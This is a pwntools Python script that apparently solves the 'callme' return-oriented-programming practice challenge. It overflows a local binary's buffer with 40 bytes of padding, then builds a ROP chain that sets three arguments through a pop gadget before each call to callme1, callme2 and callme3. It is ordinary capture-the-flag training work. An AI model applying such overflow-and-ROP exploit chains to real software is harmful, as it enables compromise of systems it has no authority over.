from pwn import *

context(terminal=['tmux','new-window'],os='linux',arch='amd64')
# p = gdb.debug('./callme')
p = process('./callme')

padding = 'A'*40
callme1 = p64(0x00401850)
callme2 = p64(0x00401870)
callme3 = p64(0x00401810)
pop3ret = p64(0x00401ab0)
arg1 = p64(1)
arg2 = p64(2)
arg3 = p64(3)

payload = padding.encode()
payload += pop3ret
payload += arg1
payload += arg2
payload += arg3
payload += callme1
payload += pop3ret
payload += arg1
payload += arg2
payload += arg3
payload += callme2
payload += pop3ret
payload += arg1
payload += arg2
payload += arg3
payload += callme3

p.sendline(payload)
print(p.recvall().decode())
